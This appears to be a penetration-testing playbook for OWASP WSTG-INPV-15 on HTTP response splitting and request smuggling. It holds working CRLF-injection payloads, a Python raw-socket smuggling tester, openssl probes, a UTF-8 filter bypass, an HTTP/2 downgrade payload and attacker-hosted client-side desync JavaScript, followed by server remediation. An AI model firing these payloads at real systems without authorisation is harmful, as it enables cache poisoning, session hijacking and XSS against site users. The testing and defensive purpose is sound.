---
name: wstg-inpv-15
description: "Testing for HTTP Splitting/Smuggling"
category: input-validation
owasp_id: WSTG-INPV-15
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-01: "CRLF/response-splitting injection smuggles a forged HTTP response into a shared cache, poisoning it to serve a Reflected XSS payload to every subsequent visitor = Critical (Mass Client Compromise via Cache Poisoning)"
---

# wstg-inpv-15

## Test ID

WSTG-INPV-15

## Test Name

Testing for HTTP Splitting/Smuggling

## High-Level Description

HTTP Request Smuggling occurs when front-end and back-end servers interpret HTTP request boundaries differently. HTTP Response Splitting injects CRLF characters to manipulate headers. Both can lead to cache poisoning, session hijacking, XSS, or bypassing security controls.

---

## What to Check

- [ ] CRLF injection in headers
- [ ] CL.TE smuggling
- [ ] TE.CL smuggling
- [ ] TE.TE smuggling
- [ ] HTTP desync attacks
- [ ] Cache poisoning

---

## How to Test

### Step 1: Test HTTP Response Splitting

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing HTTP Response Splitting..."

# CRLF injection payloads
curl -s "$TARGET/redirect?url=http://target.com%0d%0aSet-Cookie:%20malicious=true"
curl -s "$TARGET/redirect?url=http://target.com%0d%0a%0d%0a<html>injected</html>"

# Various CRLF encodings
PAYLOADS=(
    "%0d%0a"
    "%0D%0A"
    "%0d%0aSet-Cookie:injected=true"
    "%0aSet-Cookie:injected=true"
    "\r\nSet-Cookie:injected=true"
)

for payload in "${PAYLOADS[@]}"; do
    response=$(curl -sI "$TARGET/redirect?url=http://test.com$payload")
    echo "$response" | grep -i "set-cookie"
done
```

### Step 2: HTTP Smuggling Tester

```python
#!/usr/bin/env python3
"""
HTTP Smuggling/Splitting Vulnerability Tester
"""

import socket
import ssl
import time
from urllib.parse import urlparse

class HTTPSmugglingTester:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.host = self.parsed.netloc
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.findings = []

    def send_raw_request(self, request):
        """Send raw HTTP request"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            if self.parsed.scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)

            sock.connect((self.host.split(':')[0], self.port))
            sock.send(request.encode())

            response = b""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break

            sock.close()
            return response.decode('utf-8', errors='ignore')

        except Exception as e:
            return str(e)

    def test_clte_smuggling(self):
        """Test CL.TE (Content-Length.Transfer-Encoding) smuggling"""
        print("\n[*] Testing CL.TE HTTP Smuggling...")

        # CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
        request = f"""POST / HTTP/1.1\r
Host: {self.host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 6\r
Transfer-Encoding: chunked\r
\r
0\r
\r
G"""

        response = self.send_raw_request(request)

        # If smuggling works, the G becomes start of next request (GPOST would error)
        if 'HTTP/1.1 403' in response or 'Invalid' in response or 'GPOST' in response:
            print("[VULN] CL.TE Smuggling detected!")
            self.findings.append({
                'type': 'CL.TE Smuggling',
                'severity': 'Critical'
            })
            return True

        return False

    def test_tecl_smuggling(self):
        """Test TE.CL (Transfer-Encoding.Content-Length) smuggling"""
        print("\n[*] Testing TE.CL HTTP Smuggling...")

        # TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
        request = f"""POST / HTTP/1.1\r
Host: {self.host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
5c\r
GPOST / HTTP/1.1\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r
\r
x=1\r
0\r
\r
"""

        response = self.send_raw_request(request)

        if 'HTTP/1.1 403' in response or 'Invalid' in response:
            print("[VULN] TE.CL Smuggling detected!")
            self.findings.append({
                'type': 'TE.CL Smuggling',
                'severity': 'Critical'
            })
            return True

        return False

    def test_tete_smuggling(self):
        """Test TE.TE smuggling with obfuscated Transfer-Encoding"""
        print("\n[*] Testing TE.TE HTTP Smuggling...")

        te_variations = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding:\tchunked",
            "X: X\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding\r\n: chunked",
        ]

        for te in te_variations:
            request = f"""POST / HTTP/1.1\r
Host: {self.host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 4\r
{te}\r
\r
5c\r
GPOST / HTTP/1.1\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r
\r
x=1\r
0\r
\r
"""

            response = self.send_raw_request(request)

            if 'HTTP/1.1 403' in response or 'GPOST' in response:
                print(f"[VULN] TE.TE Smuggling with: {te[:30]}...")
                self.findings.append({
                    'type': 'TE.TE Smuggling',
                    'te_header': te,
                    'severity': 'Critical'
                })

    def test_crlf_injection(self):
        """Test CRLF injection for response splitting"""
        print("\n[*] Testing CRLF Injection...")

        crlf_payloads = [
            ("%0d%0aSet-Cookie:%20injected=true", "URL encoded"),
            ("%0aSet-Cookie:%20injected=true", "LF only"),
            ("\r\nSet-Cookie: injected=true", "Raw CRLF"),
            ("%E5%98%8A%E5%98%8DSet-Cookie:%20injected=true", "UTF-8 encoded"),
        ]

        for payload, desc in crlf_payloads:
            request = f"""GET /redirect?url=http://test.com{payload} HTTP/1.1\r
Host: {self.host}\r
\r
"""

            response = self.send_raw_request(request)

            if 'Set-Cookie: injected=true' in response:
                print(f"[VULN] CRLF Injection ({desc})!")
                self.findings.append({
                    'type': 'CRLF Injection',
                    'payload': payload,
                    'description': desc,
                    'severity': 'High'
                })

    def test_desync_detection(self):
        """Detect HTTP desync via timing differences"""
        print("\n[*] Testing HTTP Desync detection...")

        # Send normal request
        normal_request = f"""GET / HTTP/1.1\r
Host: {self.host}\r
\r
"""

        start = time.time()
        self.send_raw_request(normal_request)
        normal_time = time.time() - start

        # Send potential desync trigger
        desync_request = f"""POST / HTTP/1.1\r
Host: {self.host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 60\r
Transfer-Encoding: chunked\r
\r
0\r
\r
POST /admin HTTP/1.1\r
Host: {self.host}\r
\r
"""

        start = time.time()
        response = self.send_raw_request(desync_request)
        desync_time = time.time() - start

        if desync_time > normal_time + 5:
            print(f"[WARN] Timing anomaly detected (possible desync)")
            self.findings.append({
                'type': 'Possible HTTP Desync',
                'normal_time': normal_time,
                'desync_time': desync_time,
                'severity': 'High'
            })

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("HTTP SMUGGLING/SPLITTING REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo HTTP smuggling vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:50]}")

    def run_tests(self):
        """Run all HTTP smuggling tests"""
        self.test_crlf_injection()
        self.test_clte_smuggling()
        self.test_tecl_smuggling()
        self.test_tete_smuggling()
        self.test_desync_detection()
        self.generate_report()

# Usage
tester = HTTPSmugglingTester("https://target.com")
tester.run_tests()
```

---

## Tools

| Tool                       | Purpose                |
| -------------------------- | ---------------------- |
| Burp Suite (HTTP Smuggler) | Automated detection    |
| smuggler.py                | HTTP smuggling scanner |
| Turbo Intruder             | Advanced testing       |

---

## Example Commands/Payloads

```bash
# CRLF response splitting via redirect param
curl -s -I "https://{target}/redirect?url=http://test.com%0d%0aSet-Cookie:%20injected=true"

# CL.TE smuggling probe (raw request over TLS socket)
printf 'POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | openssl s_client -connect {target}:443 -quiet

# TE.CL smuggling probe
printf 'POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' | openssl s_client -connect {target}:443 -quiet
```

| Payload | Technique | Detection Pattern |
| --- | --- | --- |
| `%0d%0aSet-Cookie:%20injected=true` | CRLF response splitting | Injected `Set-Cookie` header appears in the response |
| `Content-Length` + `Transfer-Encoding: chunked` (front trusts CL) | CL.TE smuggling | Back-end error, or a leftover `G` prefixes the next response |
| Obfuscated `Transfer-Encoding: xchunked` / duplicate TE headers | TE.TE desync | 403/502, or response content for the wrong request |
| Timing delta on a crafted desync request | HTTP desync detection | Response time markedly higher than baseline |

### CRLF Filter Bypass via UTF-8 Overlong Encoding

Some frameworks/CDNs strip raw `%0d%0a` but Firefox (and some server stacks) normalize out-of-range UTF-8 characters that decode to CR/LF, slipping past naive blocklists:

```bash
# %E5%98%8A decodes to CR, %E5%98%8D decodes to LF
curl -s "https://{target}/?lang=en%E5%98%8A%E5%98%8DSet-Cookie:%20injected=true"
```

| UTF-8 char | Hex | Stripped to |
| --- | --- | --- |
| `嘊` | `%E5%98%8A` | `%0A` (LF) |
| `嘍` | `%E5%98%8D` | `%0D` (CR) |
| `嘾` | `%E5%98%BE` | `>` |
| `嘼` | `%E5%98%BC` | `<` |

### HTTP/2 Request Smuggling (downgrade to HTTP/1.1)

```bash
# When an HTTP/2 front-end downgrades to HTTP/1.1 for the back-end, a smuggled
# CRLF/header in a pseudo-header can splice a second request into the downgraded stream
curl -s --http2 "https://{target}/" -H 'header-name: ignored\r\n\r\nGET / HTTP/1.1\r\nHost: {target}'
```

### Client-Side Desync (CSD) — victim's browser triggers the smuggle

```javascript
// Hosted on an attacker page, forces the victim's browser to desync the target's connection
fetch('https://{target}/redirect', {
    method: 'POST',
    body: `HEAD /404/ HTTP/1.1\r\nHost: {target}\r\n\r\nGET /x?x=<script>alert(document.domain)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => { location = 'https://{target}/' })
```

---

## Remediation

```nginx
# Nginx - Reject ambiguous requests
proxy_request_buffering on;
proxy_http_version 1.1;

# Reject requests with both CL and TE
if ($http_transfer_encoding ~* "chunked" ) {
    set $invalid_request 1;
}
if ($http_content_length) {
    set $invalid_request "${invalid_request}1";
}
if ($invalid_request = "11") {
    return 400;
}
```

```apache
# Apache - Strict HTTP parsing
HttpProtocolOptions Strict
```

---

## Risk Assessment

| Finding                       | CVSS | Severity |
| ----------------------------- | ---- | -------- |
| HTTP Request Smuggling        | 9.8  | Critical |
| CRLF Response Splitting       | 6.1  | Medium   |
| Cache Poisoning via Smuggling | 8.1  | High     |

---

## CWE Categories

| CWE ID      | Title                                        |
| ----------- | -------------------------------------------- |
| **CWE-444** | Inconsistent Interpretation of HTTP Requests |
| **CWE-113** | Improper Neutralization of CRLF Sequences    |


---

## References

- [OWASP WSTG - WSTG-INPV-15: Testing for HTTP Splitting/Smuggling](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling)
- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PayloadsAllTheThings - CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
- [PayloadsAllTheThings - Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling)

---

## Checklist

```
[ ] CRLF injection tested
[ ] CL.TE smuggling tested
[ ] TE.CL smuggling tested
[ ] TE.TE obfuscation tested
[ ] Desync detection tested
[ ] Findings documented
```
